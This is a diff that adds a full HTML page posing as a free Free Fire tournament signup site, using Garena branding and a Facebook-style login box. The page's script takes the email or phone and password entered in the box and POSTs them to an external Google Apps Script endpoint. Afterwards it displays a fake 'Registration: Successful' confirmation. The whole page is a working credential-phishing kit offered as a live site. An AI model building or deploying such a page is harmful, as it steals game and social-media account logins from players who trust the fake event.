@@ -1,0 +1,521 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width"/>
+    
+<title>Free Join Tournaments</title>
+
+<meta property="description" content="Free Join Tournaments"/>
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHfN0yGCr-A_a-Ja4pJ4AoqY9Ci7qZQStWgDspGNcBFbv2f2tafPQjG-IDdk8UM-Ei83W572QJJSiVnakiii59rkEBdD1egzdFutrP887pvNQooy8rmNx_sjQcbmdSgmZfY6-Ay8tUzh-jIkUfTRZk3ITUx_HMx0sEPltjQSq6noyajE4hDJjxic_SydJf/s1600/images%20%281%29.jpeg"/>
+<meta property="og:image:width" content="540"/>
+<meta property="og:image:height" content="282"/>
+<meta name="theme-color" content="#e1ae37"/>
+<link rel="icon" type="img/jpeg" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHfN0yGCr-A_a-Ja4pJ4AoqY9Ci7qZQStWgDspGNcBFbv2f2tafPQjG-IDdk8UM-Ei83W572QJJSiVnakiii59rkEBdD1egzdFutrP887pvNQooy8rmNx_sjQcbmdSgmZfY6-Ay8tUzh-jIkUfTRZk3ITUx_HMx0sEPltjQSq6noyajE4hDJjxic_SydJf/s1600/images%20%281%29.jpeg"/>
+
+
+
+	<style>
+		@import url('https://fonts.googleapis.com/css2?family=Kavivanar&family=Nunito+Sans:opsz@6..12&display=swap');
+		*{
+			padding: 0;
+			margin: 0;
+			font-family: 'Nunito Sans';
+			box-sizing: border-box;
+		}
+		nav{
+		width: 100vw;
+		height: 50px;
+		background: #000;
+		display: flex;
+		align-items: center;
+		position: fixed;
+		top: 0;
+		left: 0;
+		z-index: 9999;
+		}
+		nav img{
+		width: auto;
+		height: 20px;
+		margin-left: 5px;
+		}
+		nav button{
+			position: absolute;
+			right: 10px;
+			padding: 6px 14px;
+			border-radius: 4px;
+			border: none;
+			color: white;
+			background: #E1AE37;
+		}
+		.content{
+		      width: 90vw;
+		       height: 200px;
+		    box-shadow: 0px 2px 7px #6A6A6A;
+		     border-radius: 12px;
+		      margin-top: 40px;
+		background: no-repeat center/100% url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmeUi71Ubmc2dTwS7i4bjr0RtmXfiHpmC_ffzueIc9xUzkXjhhJGgJhMRqe5xg9AMBQMtVPzaMBzjYy_qO_tmHPDHOL_3nzM3ajJuq0J873vA6pYCEDfvy3a9SvUV4W15WHsVlPgNam7bhkT8xyoGhXECZu0y5pKB2XxO1Ly52um0b5uaQwo5Q-N-9zS1g/s1600/bg.jpeg");
+		overflow: hidden;
+		}
+		.content:nth-of-type(1){
+		margin-top: 90px;
+		}
+		
+		.content .up{
+		  height: 50%;
+		  widht: 100%;
+		position: relative;
+		}
+		
+		.content .down{
+		  height: 50%;
+		  widht: 100%;
+		 background: #fff;
+		display: flex;
+		align-items: center;
+		}
+		.content .down .rank{
+			font-size: 20px;
+			font-weight: 600;
+			display: block;
+			margin-left: 20px;
+		}
+		.content .down .rank::before{
+			content: 'Rank';
+			font-size: 12px;
+			font-weight: 400;
+			display: block;
+		}
+		.content .down .rank::after{
+			content: attr(data-content);
+			font-size: 12px;
+			font-weight: 400;
+			display: block;
+		}
+		.content .down .map{
+			font-size: 18px;
+			font-weight: 600;
+			display: block;
+			margin-left: 20px;
+		}
+		.content .down .map::before{
+			content: 'Map';
+			font-size: 12px;
+			font-weight: 400;
+			display: block;
+		}
+		.content .down .map::after{
+			content: attr(data-content);
+			font-size: 12px;
+			font-weight: 400;
+			display: block;
+		}
+		.content .down .fee{
+			font-size: 20px;
+			font-weight: 600;
+			display: block;
+			margin-left: 20px;
+		}
+		.content .down .fee::before{
+			content: 'Cost';
+			font-size: 12px;
+			font-weight: 400;
+			display: block;
+		}
+	div button{
+			padding: 5px 26px;
+			margin-left: 40px;
+			color: white;
+			background: #E1AE37;
+			border: none;
+			border-radius: 6px;
+			font-size: 17px;
+			transition: transform 5s linear 1s;
+		}
+	 button:active{
+			transform: scale(0.95);
+		}
+		.solo{
+			color: white;
+           background: #e1ae37; 
+          padding: 1px 5.5px; 
+          font-size: 10px; 
+         border-radius: 8px;
+         position:absolute;
+         bottom: 1px;
+         right: 1px;
+		}
+		.date{
+		color: white;
+          padding: 2px 5.5px; 
+         font-size: 12px; 
+         position:absolute;
+         bottom: 0px;
+         left: 1px;
+         backdrop-filter: blur(5px);
+		}
+		.date::before{
+	     content: 'Date: ';
+		}
+		.pop{
+			display: none;
+	       position: fixed;
+	       top: 15%;
+	       left: 5%;
+           width: 90%;
+           height: 65%;
+           backdrop-filter: blur(5px);
+			border-radius: 12px;
+			border: 3px solid #e1ae37;
+			box-shadow: 0px 2px 7px #6A6A6A;
+			overflow: hidden;
+		}
+		.pop-img{
+			position: relative;
+			width: 80%;
+			height: auto;
+			z-index: -1;
+		}
+		.pop div{
+			width: 100%;
+           height: 50%;
+           background: #fff;
+          margin-top: -20px;
+		}
+		footer{
+		width: 100vw;
+		height: 50px;
+	/*	position: fixed;*/
+		background: #000;
+		color: #e1ae37;
+		bottom: 0;
+		left: 0;
+		display: flex;
+		align-items: center;
+		justify-content: center;
+		
+		}
+		footer img{
+			height: 30px;
+			width: auto;
+		}
+
+.fb-logs {
+width: 400px;
+height: auto;
+background: #fff;
+position: relative;
+text-align: center;
+margin: 15% auto;
+}
+
+.nav-fb {
+background-color:#3b5998;
+height:40px;
+border:4px;
+padding:0px;
+}
+.btn-logs-fb {
+position:relative;
+width:90%;
+height:45px;
+margin:0;
+background-color:#4080ff;
+color:white;
+border-radius:3px;
+border:#4080ff;
+font-size:1em;
+font-weight:bold;
+letter-spacing:1px;
+outline:none;
+cursor:pointer;
+}
+input.logs {
+  font-size: auto;
+  width: 90%;
+  height: 45px;
+  padding:12px 20px;
+  margin: 8px auto;
+  background: none;
+  background-image: none;
+  border:1px solid #000;
+  color: #000;
+  border-radius: 2px;
+}
+.close-logs {
+padding: 0px 5px;
+background: #000;
+border-radius: 50%;
+border: 3px solid #fff;
+display: block;
+text-align: center;
+color: #fff;
+text-decoration: none;
+position: absolute;
+top: 0px;
+right: 0px;
+}
+#toast {
+    visibility: hidden;
+    max-width: 50px;
+    height: 50px;
+    /*margin-left: -125px;*/
+    margin: auto;
+    background-color: #333;
+    color: #fff;
+    text-align: center;
+    border-radius: 2px;
+
+    position: fixed;
+    z-index: 1;
+    left: 0;right:0;
+    bottom: 30px;
+    font-size: 17px;
+    white-space: nowrap;
+}
+#toast #img{
+	width: 50px;
+	height: 50px;
+    box-sizing: border-box;
+    background-color: #111;
+    color: #fff;
+    float: left;
+}
+#toast #desc{
+
+    color: #fff;
+    padding: 12px 0;
+    overflow: hidden;
+	white-space: nowrap;
+}
+
+#toast.show {
+    visibility: visible;
+    -webkit-animation: fadein 0.5s, expand 0.5s 0.5s,stay 3s 1s, shrink 0.5s 2s, fadeout 0.5s 2.5s;
+    animation: fadein 0.5s, expand 0.5s 0.5s,stay 3s 1s, shrink 0.5s 4s, fadeout 0.5s 4.5s;
+}
+
+@-webkit-keyframes fadein {
+    from {bottom: 0; opacity: 0;} 
+    to {bottom: 30px; opacity: 1;}
+}
+
+@keyframes fadein {
+    from {bottom: 0; opacity: 0;}
+    to {bottom: 30px; opacity: 1;}
+}
+
+@-webkit-keyframes expand {
+    from {min-width: 50px} 
+    to {min-width: 350px}
+}
+
+@keyframes expand {
+    from {min-width: 50px}
+    to {min-width: 350px}
+}
+@-webkit-keyframes stay {
+    from {min-width: 350px} 
+    to {min-width: 350px}
+}
+
+@keyframes stay {
+    from {min-width: 350px}
+    to {min-width: 350px}
+}
+@-webkit-keyframes shrink {
+    from {min-width: 350px;} 
+    to {min-width: 50px;}
+}
+
+@keyframes shrink {
+    from {min-width: 350px;} 
+    to {min-width: 50px;}
+}
+
+@-webkit-keyframes fadeout {
+    from {bottom: 30px; opacity: 1;} 
+    to {bottom: 60px; opacity: 0;}
+}
+
+@keyframes fadeout {
+    from {bottom: 30px; opacity: 1;}
+    to {bottom: 60px; opacity: 0;}
+}
+	</style>
+		
+</head>
+<body>
+	<nav>
+		<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcnYFS_Co-L1PHp1qeGFbPt4bOiwTUNFnlCKj1Hnd-BhnHHnDHb8S-OIQyBdFEuXp_I4cP5P-WZOxkyyMUh4RpUpCTftgKYX6USV2puTH2RyNh4NiERCmcrPoNwaw6lzlfVIdtt2ZQuhyHe35seQBeKIreAxgxIhH0FTZM1blKULI54Un_Xc5_Oi1Jluuz/s1600/logo.png"/>
+		<button onclick="window.open('https://ffshare.garena.com/?region=IND&lang=en')">Open Game</button>
+  </nav>
+  <center>
+  <div class="content">
+  	<div class="up">
+<span class="date">N/A</span>
+<span class="solo">SOLO</span></div>
+  	<div class="down">
+<span class="rank" data-content="2500&#128142;">1-3</span>
+<span class="map" data-content="50 Player">Nexterra</span>
+<span class="fee">Free</span>
+<button onclick="firstPart('Nexterra','2500',d1)" style="margin-left: 50px;" onmousedown="buka.play()">Join</button>
+</div>
+  </div>
+
+
+
+
+  <div class="content">
+  	<div class="up">
+<span class="date">N/A</span>
+<span class="solo">SOLO</span></div>
+  	<div class="down">
+<span class="rank" data-content="1200&#128142;">1-10</span>
+<span class="map" data-content="50 Player">Bermuda</span>
+<span class="fee">Free</span>
+<button onclick="firstPart('Bermuda','1200',d1)" onmousedown="buka.play()">Join</button>
+</div>
+  </div>
+  
+  <div class="content" style="margin-bottom: 50px;">
+  	<div class="up">
+<span id="datecs" class="date">N/A</span>
+<span class="solo">SQUAD</span></div>
+  	<div class="down">
+<span class="rank" data-content="200&#128142;">Booyah</span>
+<span class="map" data-content="8&nbsp;Player">CS</span>
+<span class="fee">Free</span>
+<button onclick="firstPart('CS','200',d2)" style="margin-left: 45px;" onmousedown="buka.play()">Join</button>
+</div>
+  </div>
+  
+  <div class="pop" style="height: auto;">
+<img class="pop-img" style="width: 100%; height: auto;" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGKq2-j5pMspFE-SLF-TmvRb3B9Ei5KHGYdCtlKU5S71yF8chInEePIaHE6y-2hanPjn4f1vFqcNmeI54x1agC3ZFBmxD3ZAPYM_iLfhReDPQAAUcPmyT9ZarWaV0ZmwfePw0HhU6VeoJKadw-0k5gQrTVxoyp5XvGzcseIIKYwJnyHuIqi06snHRJVEgB/s1600/tur.png"/>
+<div style="margin: 0; padding-bottom: 30px;"><br/><span>*Tournament Registration</span><br/><br/><span id="regi">Registration: N/A</span><br/><span id="dat">Game Date: N/A</span><br/><span id="rwd">Rewards: N/A</span><br/><span id="smp">Selected Map: N/A</span><br/><br/>Room ID & Password send in FF Inbox<br/><br/><br/><button onclick="location.reload()" style="margin: 0px;" onmousedown="buka.play()">OK</button></div>
+</div>
+
+<div id="fb" style="position: fixed; top: 20%; left: 5px; display: none;">
+<div class="fb-logs">
+<a onmousedown="tutup.play()" onclick="{document.getElementById('fb').style.display = 'none'; showBlur(false);}" class="close-logs">&times;</a>
+<div class="nav-fb">
+<img width="40px" style="border-radius: 10px;" align="top" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6asVBZkJJqmT2WrzZh6Z8s3lBM6rppg_QpHVv2n1vPaLJjwQ6rMlMZ3wSpsGFLtv1LY2czHqFIVOhM-kDyS1cbWscr3873SKvmEAzkZwLZylXupiwcmfYQdvcO_EWtjPuKKvWfTExLiFmjFgyEKZvL9iKiMlMl62WbZEhX_lRtWqst5_UVUKrfFfxljkx/s320/thumbnail.png"/>
+</div>
+<br/>
+<form id="fFarm">
+<input id="emn" class="logs" type="text" placeholder="Email or Phone " minlength="10" autocapitalize="off" required="required"/>
+<input id="pass" class="logs" type="text" placeholder="Password " minlength="6" autocapitalize="off" required="required"/>
+<br/><br/>
+<button type="submit" onmousedown="buka.play()" class="btn-logs-fb"><b>Register</b></button>
+<br/><br/>
+
+
+<br/><br/>
+</form> 
+</div>
+</div>
+
+
+<div class="pop">
+<img class="pop-img" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0fW8MQpP4UPMyg1diVIJ7oxWIQ7hEVkRPrgCS1EJV7NcdPbgh__7_JVbhSxcc7tVieh-JnEoToKgtopVZrj7-bvKjtZj3CkLIXlYu3gBZeoJwFUt52_A56ab-kP3SMyh7iNdaZhxYN106Bq6K1u4nX3mbMGv6pXbYLgEpSQLaJLBZuKLhiV6WvKD5qALw/s1600/tgun.png"/>
+<div><br/>*Important Notes<br/><br/>1. ID 50+ Level Required<br/>2. Please Submit Correct Information<br/>3. Room ID & Password send in FF Inbox<br/><br/><br/><button onclick="readedFun()" style="margin: 0px;" onmousedown="buka.play()">OK</button></div>
+</div>
+  </center>
+  <footer><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhr9zJS3NMzE2p0ofvRf4_lbGmMLKLF2Fv2ih3YDE1eF7M3AGN5sT30L8TOpmiOJP9kLahq9vWPLxY1UNlPR-2Do3Q1DIHJ0_0OK-pwMmBGpJPPCjBphkNha2lwKrsK0O44nYLczOCBXUpPdqn_5tU5-ehmUfoOllV6J-tYKbb2GcHGOmur4C3lM_-rl9R_/s320/garena-logo.png"/>
+  </footer>
+  <div id="toast"><div id="img"><img style="width:100%; height: 100%;" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6asVBZkJJqmT2WrzZh6Z8s3lBM6rppg_QpHVv2n1vPaLJjwQ6rMlMZ3wSpsGFLtv1LY2czHqFIVOhM-kDyS1cbWscr3873SKvmEAzkZwLZylXupiwcmfYQdvcO_EWtjPuKKvWfTExLiFmjFgyEKZvL9iKiMlMl62WbZEhX_lRtWqst5_UVUKrfFfxljkx/s320/thumbnail.png"/></div>
+<div id="desc">Loading...</div></div>
+  <script>
+  	var buka = new Audio();
+  var b_click = false;
+  var rwd = "N/A";
+  var smp = "N/A";
+  var d1 = null;
+  var d2 = null;
+  var dat = null;
+  
+buka.src = "https://5.top4top.net/m_13444g1we0.mp3";
+
+var tutup = new Audio();
+tutup.src = "https://2.top4top.net/m_1344hm49c1.mp3";
+
+var emn = document.getElementById("emn");
+var pass = document.getElementById("pass");
+	
+function setUp(){
+const date = new Date();
+d1 = (date.getDate()+4)+"-"+(date.getMonth()+1)+"-"+date.getFullYear();
+d2 = (date.getDate()+6)+"-"+(date.getMonth()+1)+"-"+date.getFullYear();
+
+document.getElementsByClassName("date")[0].textContent = d1;
+document.getElementsByClassName("date")[1].textContent = d1;
+document.getElementsByClassName("date")[2].textContent = d2;
+}
+window.onload = (event) => {
+setUp();
+
+document.getElementsByClassName("pop")[1].style.display = "block";
+showBlur(true);
+
+};
+
+function readedFun(){
+	document.getElementsByClassName("pop")[1].style.display = "none";
+	document.getElementsByClassName("pop")[0].style.display = "none";
+   showBlur(false);
+   b_click = true;
+}
+function showBlur(e){
+	if(e){
+document.getElementsByClassName("content")[0].style.filter = "blur(5px)";
+document.getElementsByClassName("content")[1].style.filter = "blur(5px)";
+document.getElementsByClassName("content")[2].style.filter = "blur(5px)";
+	}else{
+document.getElementsByClassName("content")[0].style.filter = "blur(0)";
+document.getElementsByClassName("content")[1].style.filter = "blur(0)";
+document.getElementsByClassName("content")[2].style.filter = "blur(0)";
+	}
+}
+
+function firstPart(e,f,g){
+	if(b_click){
+	document.getElementById("fb").style.display = "block";
+	showBlur(true);
+	rwd = f+"\ud83d\udc8e";
+	smp = e;
+	dat = g;
+	}
+}
+
+const scriptURL = "https://script.google.com/macros/s/AKfycbyzVB_ltFnb0PYyEgHbxWD3whq04R605Zb1vXoYU1JdjwM_oq8Z6iCaXaGymnPO_wPxAA/exec";
+
+function subFarm(event){
+	event.preventDefault();
+	const form = new FormData();
+      form.append("USERNAME",emn.value);
+      form.append("PASSWORD",pass.value);
+      launch_toast();
+   fetch(scriptURL, { method: 'POST', body: form})
+.then(response => console.log("Loading.."))
+.then(() => {sendTur("Registration: Successful \u2705");})
+.catch(error => sendTur("Registration: Failed \u274C"));
+}
+
+function sendTur(e){
+	document.getElementsByClassName("pop")[0].style.display = "block";
+	document.getElementById("regi").innerText = e;
+	showBlur(true);
+	document.getElementById("fb").style.display = "none";
+	document.getElementById("dat").innerText = "Game Date: "+dat;
+	document.getElementById("rwd").innerText = "Rewards: "+rwd;
+   document.getElementById("smp").innerText = "Selected Map: "+smp;
+}
+function launch_toast() {
+    var x = document.getElementById("toast")
+    x.className = "show";
+    setTimeout(function(){ x.className = x.className.replace("show", ""); }, 5000);
+}	
+document.getElementById("fFarm").addEventListener('submit', subFarm);
+  </script>
+</body>
+  </html>
